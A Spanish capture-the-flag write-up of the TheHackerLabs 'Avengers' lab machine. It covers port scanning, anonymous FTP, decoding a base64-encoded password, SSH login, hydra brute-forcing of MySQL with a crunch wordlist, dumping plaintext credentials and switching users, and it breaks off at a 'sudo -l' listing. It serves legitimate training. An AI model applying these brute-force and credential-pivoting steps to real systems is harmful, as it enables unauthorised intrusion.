---
title: "Avengers - TheHackerLabs"
date: 2025-06-04
draft: false
slug: "THL-writeup-avengers"
excerpt: "Esta es una máquina fácil, pero que necesitas prestar mucha atención a todo lo que te encuentres. El reto de la máquina es obtener 9 flags que encontrarás conforme vulneres los servicios activos. Comenzamos primero enumerando el servicio FTP, donde encontramos una flag y un archivo ZIP. Luego, analizamos la página web en donde encontramos varias vulnerabilidades, siendo que aquí encontramos un usuario y contraseña que nos permiten ganar acceso a la máquina vía SSH. Dentro de la máquina, encontramos una pista que resulta ser una contraseña para poder descomprimir el archivo ZIP que habíamos encontrado, siendo otra pista para la contraseña del servicio MySQL. Creamos un wordlist con esta pista y aplicamos fuerza bruta al servicio MySQL, logrando encontrar la contraseña y ganar acceso al MySQL. Enumeramos las bases de datos y encontramos una que contiene la contraseña de otro usuario. Nos autenticamos como este usuario y descubrimos que tiene privilegios de Root para usar la Bash, con lo que logramos escalar privilegios y convertirnos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "FTP", "MySQL", "FTP Enumeration", "Web Enumeration", "Fuzzing", "Base64 Decoding", "Brute Force Attack", "MySQL Enumeration", "System Enumeration (Linux)", "User Pivoting", "Binary Decoding", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "echo"
  - "base64"
  - "ssh"
  - "sudo"
  - "grep"
  - "tree"
  - "cat"
  - "unzip"
  - "crunch"
  - "hydra"
  - "mysql"
  - "bash"
  - "python3"
  - "nano"
  - "id"
  - "su"
  - "strings"
links:
  - "https://esolangs.org/wiki/Pikalang"
  - "https://www.dcode.fr/pikalang-language"
  - "https://gchq.github.io/CyberChef/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-avengers/avengers.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.80
PING 192.168.10.80 (192.168.10.80) 56(84) bytes of data.
64 bytes from 192.168.10.80: icmp_seq=1 ttl=64 time=1.58 ms
64 bytes from 192.168.10.80: icmp_seq=2 ttl=64 time=0.928 ms
64 bytes from 192.168.10.80: icmp_seq=3 ttl=64 time=1.57 ms
64 bytes from 192.168.10.80: icmp_seq=4 ttl=64 time=0.910 ms

--- 192.168.10.80 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 0.910/1.248/1.582/0.329 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.80 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 09:29 CST
Initiating ARP Ping Scan at 09:29
Scanning 192.168.10.80 [1 port]
Completed ARP Ping Scan at 09:29, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:29
Scanning 192.168.10.80 [65535 ports]
Discovered open port 21/tcp on 192.168.10.80
Discovered open port 80/tcp on 192.168.10.80
Discovered open port 3306/tcp on 192.168.10.80
Discovered open port 22/tcp on 192.168.10.80
Completed SYN Stealth Scan at 09:29, 26.40s elapsed (65535 total ports)
Nmap scan report for 192.168.10.80
Host is up, received arp-response (0.00073s latency).
Scanned at 2025-06-03 09:29:14 CST for 26s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 64
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
           Raw packets sent: 131079 (5.767MB) | Rcvd: 19 (900B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay algunos puertos abiertos, siendo el **puerto 21 y 3306** los que me da curiosidad que esté abiertos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80,3306 192.168.10.80 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 09:30 CST
Nmap scan report for 192.168.10.80
Host is up (0.0013s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 6f:85:17:02:1a:9d:94:c3:b3:4e:92:4b:05:3a:96:a2 (ECDSA)
|_  256 57:6b:d4:59:bd:3b:b5:c0:3f:1b:7e:c0:b9:9a:69:6d (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))

|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Avengers Hacking \xC3\x89tico
| http-robots.txt: 2 disallowed entries 
|_/webs/ /mysql/
3306/tcp open  mysql   MySQL 8.0.36-0ubuntu0.22.04.1

| mysql-info: 
|   Protocol: 10
|   Version: 8.0.36-0ubuntu0.22.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Support41Auth, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, LongPassword, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolNew, FoundRows, Speaks41ProtocolOld, SupportsCompression, LongColumnFlag, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: k T\x0C7	\x1E~A7_+;n]\x06F`_m
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.36_Auto_Generated_Server_Certificate
| Not valid before: 2024-03-21T19:56:11
|_Not valid after:  2034-03-19T19:56:11
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Analizando el escaneo, parece que podemos autenticarnos en el **servicio FTP** del **puerto 21** como el **usuario anonymous**, aunque no pudo listar su contenido.

La página web activa en el **puerto 80** está mostrando 2 directorios que podemos visitar después. Además, está mostrando contenido, por lo que parece ser una página vacía.

Por último, parece que podemos autenticarnos al **servicio MySQL** del **puerto 3306**, pero de momento no tenemos credenciales válidas.

Vayamos primero al **servicio FTP** y luego a la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio FTP {#FTP}

Entremos:
```bash
ftp 192.168.10.80
Connected to 192.168.10.80.
220 Welcome to blah FTP service.
Name (192.168.10.80:berserkwings): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Bien, vamos a listar los recursos que están aquí:
```bash
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             459 Mar 24  2024 FLAG.txt
-rw-r--r--    1 0        0             417 Mar 24  2024 credential_mysql.txt.zip
226 Directory send OK.
```
Tenemos una flag y un **archivo ZIP** que parece contener la contraseña del **servicio MySQL**.

Descarguémoslos:
```bash
ftp> get FLAG.txt
ftp> binary
200 Switching to Binary mode.
ftp> get credential_mysql.txt.zip
ftp> exit
221 Goodbye.
```

Veamos qué dice el archivo **FLAG.txt**:
```bash
cat FLAG.txt
.
   ###     ###                         ##
  ## ##     ##                        ####
   #        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
  ##        ##     ##  ##    #####
 ####      ####     #####       ##     ##
                            #####
.
Alright, you have flag 3/9.

This flag is worth 10 points.

Wow, you found this flag very quickly, we should secure this FTP more...
```
Tendremos que conseguir 8 flags para completar con el objetivo final.

Dejaremos el **archivo ZIP** para más tarde, ya que no lo podremos crackear (al menos yo no pude).

Vayamos a la página web.

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura1.png">
</p>

Bastante extraña esta página, pero ahí podemos ver una página de **inicio** y otra que se llama **secreta**. Además, vemos el botón hackear.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura2.png">
</p>

No hay mucho que nos muestre y nos ayude.

Si damos click en el botón **Hackear**, nos saldrá un mensaje de alerta:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura3.png">
</p>

Revisando el código fuente de esta página, encontraremos cosillas interesantes:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura4.png">
</p>

Ahí está la página **secreta** y parece que hay una oculta que se llama **developers.html**.

Podemos ver el script que aplica el mensaje de alerta.

Y vemos un comentario que menciona una ruta de un directorio llamada `/code`.

Si entramos en ese directorio, encontraremos una página llamada **code.html**:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura5.png">
</p>

Al entrar no veremos nada, pues todo estará en blanco, pero si revisamos el código fuente, podremos ver un par de comentarios, siendo el último una especie de mensaje codificado por **Pikachu**:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura6.png">
</p>

Investigando ese mensaje codificado, resulta que es **codificación pikalang**:

| **Codificación Pikalang** |
|:-----------:|
| *Pikalang es un lenguaje de programación esotérico y de broma creado por Blake Grotewold . Es idéntico a Brainfuck , salvo que las instrucciones se sustituyen por los sonidos de Pikachu de Pokémon. Es una de las muchas sustituciones triviales de comandos de Brainfuck.* |

Podemos decodificar este mensaje con la siguiente página: <a href="https://www.dcode.fr/pikalang-language" target="_blank">dcode - pikalang</a>

Al hacerlo, nos da un mensaje de burla:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura7.png">
</p>

Ni una pista.

Movámonos a la página **secreta**.

#### Analizando Página secrets.html {#secreta}

Entrando ahí, veremos un buscador:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura8.png">
</p>

Sí buscamos algo, nos dará el mismo mensaje.

Revisemos el código fuente:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura9.png">
</p>

Vemos las mismas páginas que vimos en el código fuente de la página principal.

Pero me llama la atención el script que aparece ahí, vamos a verlo:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura10.png">
</p>

Parece que al darle la frase **"fuerzabruta"**, nos da el nombre **Hulk**. ¿Esto será un usuario y contraseña?

Guardémoslos para después.

#### Analizando Página developers.html {#developers}

Entremos a esta página que aparece en el código fuente de la página principal y de la página **secrets.html**:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura11.png">
</p>

Encontramos un login.

Pero al utilizar credenciales random, nos saldrá un mensaje de error en **MySQL**:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura12.png">
</p>

Veamos el código fuente para entender mejor este error:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura13.png">
</p>

Muy bien, parece que este formulario es vulnerable a **inyecciones SQL**, no solo porque lo mencioné sino porque la consulta que se aplica para revisar el usuario y contraseña dados, no está aplicando ninguna sanitización, por lo que podemos aplicar **inyecciones SQL** para hacer un bypass de este login.

La cuestión aquí, es que parece que no importa lo que le demos, siempre nos da el error `connect_error) { die`, indicando que no estamos conectándonos a la base de datos.

Puede que la BD no esté levantada o haya un problema de conexión en la BD.

Quizá ese usuario que aparece, nos sirva para más adelante, así que guárdalo.

Como no veo otra cosa que podamos analizar de las páginas que ya vimos, solamente queda aplicar **Fuzzing**.

### Fuzzing {#fuzz}

Empecemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt:FUZZ -u http://192.168.10.80/FUZZ -t 300
.
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

php                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 138ms]
flags                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 118ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 84ms]
code                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 242ms]
mysql                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 177ms]
webs                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 154ms]
                        [Status: 200, Size: 1105, Words: 268, Lines: 39, Duration: 242ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 69ms]
:: Progress: [1185240/1185240] :: Job [1/1] :: 1440 req/sec :: Duration: [0:12:17] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.80/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/php                  (Status: 301) [Size: 314] [--> http://192.168.10.80/php/]
/flags                (Status: 301) [Size: 316] [--> http://192.168.10.80/flags/]
/code                 (Status: 301) [Size: 315] [--> http://192.168.10.80/code/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.10.80/css/]
/mysql                (Status: 301) [Size: 316] [--> http://192.168.10.80/mysql/]
/webs                 (Status: 301) [Size: 315] [--> http://192.168.10.80/webs/]
/server-status        (Status: 403) [Size: 279]
Progress: 1185240 / 1185241 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Encontramos varios directorios, pero de ellos solamente no hemos visto el contenido del directorio `/flags` y `/mysql`.

Veamos qué descubrimos.

#### Analizando Contenido de Directorio /flags {#flags}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura14.png">
</p>

Parece que solamente hay un archivo y es una flag:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura15.png">
</p>

Encontramos la **flag 1**.

Con esto, ya tenemos 2 flags.

#### Analizando Contenido de Directorio /mysql {#mysql}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura16.png">
</p>

Solamente hay dos archivos y uno de ellos es una flag:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura17.png">
</p>

Muy bien, encontramos la **flag 2**.

Ya tenemos 3 flags.

Veamos el otro archivo llamado **mysql.html**:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura18.png">
</p>

Solamente muestra un mensaje para que descubramos los secretos de la base de datos.

Veamos el código fuente:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura19.png">
</p>

Al final, encontramos un comentario que indica que es una contraseña de algún usuario que está por ahí.

Pero esta contraseña parece estar codificada.

Analicémosla y decodifiquémosla.

## Explotación de Vulnerabilidades {#Explotacion}

### Decodificando Contraseña en Base64 y Ganando Acceso a la Máquina Víctima Vía Servicio SSH {#Decodificacion}

Analicemos la contraseña: 

* Primero, si contamos cuantos caracteres tiene, descubrimos que tiene 32, siendo este un número par, que es indicativo de que se usó **base64** para codificarlo.
* Segundo, se pueden ver letras variadas de todo el abecedario, tanto en minúsculas como en mayúsculas y se usan números también.
* Tercero, si lo decodificamos una vez en **base64**, podremos ver que tiene 24 caracteres y podemos ver los caracteres **"=="**, siendo otro indicativo de **base64**.

En resumen, la contraseña se codificó en **base64** por lo menos 3 veces. 

La puedes decodificar de esta forma:
```bash
echo -n "V201V2JHTnVjR2haYmtveFpFZEZQUT09" | base64 -d | base64 -d | base64 -d
fuerzabruta
```
Curiosamente, ya habíamos visto esa contraseña en el script utilizado por la página **secret.html**, que al usarla, menciona al personaje **Hulk**.

Quizá estas credenciales sirvan para entrar al **servicio SSH**.

Comprobémoslo:
```bash
ssh hulk@192.168.10.80
hulk@192.168.10.80's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
...
...
Last login: Tue Jun  3 17:28:16 2025
hulk@TheHackersLabs-Avengers:~$ whoami
hulk
```
Estamos dentro.

Aquí encontramos una flag, pero nos da un mensaje en lugar de la flag del usuario:
```bash
hulk@TheHackersLabs-Avengers:~$ cat user.txt 
.
           ###
            ##
  ####      ##     ##  ##    ####
 ##  ##     ##     ##  ##   ##  ##
 ##         ##     ##  ##   ######
 ##  ##     ##     ##  ##   ##
  ####     ####     ######   #####
.
The FLAG will have to be somewhere in this directory... just look carefully
```
Investiguemos.

## Post Explotación {#Post}

### Enumeración de Archivos del Usuario Hulk {#hulk}

Veamos si nuestro usuario tiene algún privilegio:
```bash
hulk@TheHackersLabs-Avengers:~$ sudo -l
[sudo] password for hulk: 
Sorry, user hulk may not run sudo on TheHackersLabs-Avengers.
```
No tenemos ninguno.

Comprobemos qué usuarios existen en la máquina:
```bash
hulk@TheHackersLabs-Avengers:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
thanos:x:1000:1000:thanos:/home/thanos:/bin/bash
stif:x:1001:1001:stif,,,:/home/stif:/bin/bash
hulk:x:1002:1002:hulk,,,:/home/hulk:/bin/bash
antman:x:1003:1003:antman,,,:/home/antman:/bin/bash
```
Hay 5 usuarios, incluyéndonos.

Revisemos los archivos de este usuario:
```bash
hulk@TheHackersLabs-Avengers:~$ ls -la
total 48
drwxr-xr-x 8 hulk hulk 4096 ago 15  2024 .
drwxr-xr-x 6 root root 4096 mar 21  2024 ..
lrwxrwxrwx 1 root root    9 ago 15  2024 .bash_history -> /dev/null
-rw-r--r-- 1 hulk hulk  220 mar 21  2024 .bash_logout
-rw-r--r-- 1 hulk hulk 3771 mar 21  2024 .bashrc
drwx------ 2 hulk hulk 4096 mar 21  2024 .cache
drwxr-xr-x 7 root root 4096 mar 24  2024 db
drwxrwxr-x 3 hulk hulk 4096 ago 15  2024 .local
drwxr-xr-x 3 root root 4096 mar 23  2024 mysql
drwxr-xr-x 2 root root 4096 mar 22  2024 .passwd
-rw-r--r-- 1 hulk hulk  807 mar 21  2024 .profile
-rw-r--r-- 1 root root  280 mar 24  2024 user.txt
drwxr-xr-x 2 root root 4096 mar 22  2024 wait
```

Hay varios directorios y vemos la flag del usuario:
```bash
hulk@TheHackersLabs-Avengers:~$ cat user.txt 
.
           ###
            ##
  ####      ##     ##  ##    ####
 ##  ##     ##     ##  ##   ##  ##
 ##         ##     ##  ##   ######
 ##  ##     ##     ##  ##   ##
  ####     ####     ######   #####
.
The FLAG will have to be somewhere in this directory... just look carefully
```
Bien, entonces debemos buscar la flag por aquí o quizá lo tendrá otro usuario.

Para no ir revisando de uno en uno, utilicemos el comando **tree** para que nos muestre todos los archivos del directorio actual (`-a`):
```bash
hulk@TheHackersLabs-Avengers:~$ tree -a
.
├── .bash_history -> /dev/null
├── .bash_logout
├── .bashrc
├── .cache
│   └── motd.legal-displayed
├── db
│   ├── f
│   │   └── burro
│   ├── flag
│   │   └── NO_FLAG.txt
│   ├── g
│   │   └── algo
│   ├── no
│   │   └── no
│   │       └── no
│   │           └── nothing
│   └── no_flag
│       ├── flag
│       │   └── FLAG.txt
│       └── no
│           └── posibiliti
├── .local
│   └── share
│       └── nano
├── mysql
│   └── hint
│       ├── avengers
│       ├── QUEEE
│       │   └── .nothing.txt
│       ├── wo
│       └── zip
│           └── shit_how_they_did_know_this_password.txt
├── .passwd
│   ├── escalate_privileges.sh
│   └── README.txt
├── .profile
├── user.txt
└── wait
    └── decrypt.txt
```
Hay varios archivos que podemos ver.

Primero, veamos esa flag:
```bash
hulk@TheHackersLabs-Avengers:~$ cat db/no_flag/flag/FLAG.txt 

   ###     ###                         ##
  ## ##     ##                        ####
   #        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
  ##        ##     ##  ##    #####
 ####      ####     #####       ##     ##
                            #####

Alright, you have the 5/9 flag.

This flag is worth 10 points.

You found the flag hidden among many directories, how clever...
```
Excelente, tenemos la cuarta flag.

Curiosamente, parece que encontramos la contraseña para el **archivo ZIP** que no pudimos crackear:
```bash
hulk@TheHackersLabs-Avengers:~$ cat mysql/hint/zip/shit_how_they_did_know_this_password.txt 
                                      ###
                                       ##
 ##  ##   ##  ##    #####    ######    ##
 #######  ##  ##   ##       ##  ##     ##
 ## # ##  ##  ##    #####   ##  ##     ##
 ##   ##   #####        ##   #####     ##
 ##   ##      ##   ######       ##    ####
          #####                ####
.
Congratulations, you found the password to decrypt the compressed FTP .zip file

Now you know what to do with this... I guess

password: (You thought I would give you the password so quickly, because if you look closely at the file you would see the password more clearly...)
```
Claramente, la contraseña **archivo ZIP** es el nombre de este archivo, pero guardémosla de momento.

En un directorio oculto, hay un script que no podemos ver ni usar, ya que pertenece al **Root** y un archivo **README.txt**:
```bash
hulk@TheHackersLabs-Avengers:~/.passwd$ cat README.txt 
You will find a user who can do "sudo /usr/bin/bash" to be able to run that .sh without passwd, be patient hehe
```
Si esto es cierto, podríamos escalar privilegios enseguida.

Por último, hay un archivo llamado **decrypt.txt**:
```bash
hulk@TheHackersLabs-Avengers:~$ cat wait/decrypt.txt 
I'm going to provide you with a decryption password for some file, guess which file could be the one that decrypts this...

Password: decryptavengers

                               ###             ###                       ###                  ###   ######
                                ##              ##                        ##                 ####   ##  ##
  ### ##   ####     ####        ##              ##      ####     ####     ##  ##            ## ##       ##
 ##  ##   ##  ##   ##  ##    #####              ##     ##  ##   ##  ##    ## ##            ##  ##      ##
 ##  ##   ##  ##   ##  ##   ##  ##              ##     ##  ##   ##  ##    ####             #######    ##
  #####   ##  ##   ##  ##   ##  ##              ##     ##  ##   ##  ##    ## ##                ##     ##
     ##    ####     ####     ######            ####     ####     ####     ##  ##               ##     ##
 #####
```
Guardemos esta contraseña para más adelante.

Ya que no hay nada más que ver, vamos a descomprimir el **archivo ZIP** que contiene la contraseña del **servicio MySQL**.

### Aplicando Fuerza Bruta y Enumeración al Servicio MySQL {#MySQL}

Al descomprimir el **archivo ZIP** con la herramienta **unzip**, tenemos un archivo de texto que contiene la contraseña del **servicio MySQL**:
```bash
unzip credential_mysql.txt.zip
Archive:  credential_mysql.txt.zip
[credential_mysql.txt.zip] credential_mysql.txt password: 
  inflating: credential_mysql.txt
```

Leámoslo:
```bash
cat credential_mysql.txt
Listen, stif, I sent you the password of my MySQL user by email, but I think you didn't get it, I'll send it to you here:

User: hulk
Password: fuerzabrutaXXXX

Remember to change the "XXXX" to a secure number combination before sending.

HINT: it is in a range of 0-3000
```
Bien, tenemos que crear un wordlist para poder aplicar fuerza bruta.

Lo creamos con la herramienta **crunch**:
```bash
crunch 15 15 0123456789 -t fuerzabruta@@@@ -o wordlist.txt
Crunch will now generate the following amount of data: 160000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000
```

Y aplicamos fuerza bruta con **hydra**:
```bash
hydra -l 'hulk' -P wordlist.txt mysql://192.168.10.80 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-03 11:38:55
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking mysql://192.168.10.80:3306/
[3306][mysql] host: 192.168.10.80   login: hulk   password: fuerzabruta2024
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-03 11:39:27
```
Genial, la tenemos.

Entremos al **servicio MySQL**:
```bash
mysql -u 'hulk' -h 192.168.10.80 -P 3306 -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 4073
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Aquí podemos encontrar otra flag en la base de datos llamada **db_flag**:
```bash
MySQL [(none)]> use db_flag;
MySQL [db_flag]> select * from flag;
+----+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

| id | flag     | content                                                                                                                                                                          |
+----+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

|  1 | FLAG.txt | Alright, you have the 4/9 flag. This flag is worth 10 points. Now that you have this flag, keep looking, you are getting closer to the end, but there is still a long way to go. |
+----+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.002 sec)
```
Ya tenemos 5 flags.

Hay otra BD que tiene datos de nuestro interés:
```bash
MySQL [mysql]> use no_db;
MySQL [no_db]> show tables;
+-----------------+

| Tables_in_no_db |
+-----------------+

| passwords       |
| users           |
+-----------------+
2 rows in set (0.002 sec)
```

Si vemos la tabla **passwords**, encontraremos la posible contraseña del **Root**:
```bash
MySQL [no_db]> select * from passwords;
+----+--------------------------------------------------------------+----------------------------------------------------+

| id | password                                                     | description                                        |
+----+--------------------------------------------------------------+----------------------------------------------------+

|  1 | wr9UZSBjcmVlcyBxdWUgc2VyaWEgdGFuIGZhY2lsPyBKQUpBSkFKQUpKQUpB | Desencripta esa contraseña para poder ser root ;)  |
+----+--------------------------------------------------------------+----------------------------------------------------+
1 row in set (0.002 sec)
```
Parece que está en **base64**.

Vamos a comprobarlo:
```bash
echo -n "wr9UZSBjcmVlcyBxdWUgc2VyaWEgdGFuIGZhY2lsPyBKQUpBSkFKQUpKQUpB" | base64 -d
¿Te crees que seria tan facil? JAJAJAJAJJAJA
```
Muy gracioso.

Viendo la tabla **users**, encontramos algo muy útil:
```bash
MySQL [no_db]> select * from users;
+----+--------+---------------+

| id | user   | password      |
+----+--------+---------------+

|  1 | stif   | escudoamerica |
|  2 | hulk   | fuerza*****   |
|  3 | antman | ******        |
|  4 | thanos | NOPASSWD      |
+----+--------+---------------+
4 rows in set (0.002 sec)
```
La única contraseña que podemos probar, será la del **usuario stif**.

### Autenticandonos como Usuario stif y Escalando Privilegios para Ser Root {#stif}

Desde nuestra sesión del **usuario hulk**, nos autenticamos como el **usuario stif**:
```bash
hulk@TheHackersLabs-Avengers:~$ su stif
Password: 
stif@TheHackersLabs-Avengers:/home/hulk$ whoami
stif
```

Obtengamos los privilegios de este usuario:
```bash
stif@TheHackersLabs-Avengers:~$ sudo -l
Matching Defaults entries for stif on TheHackersLabs-Avengers:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User stif may run the following commands on TheHackersLabs-Avengers:
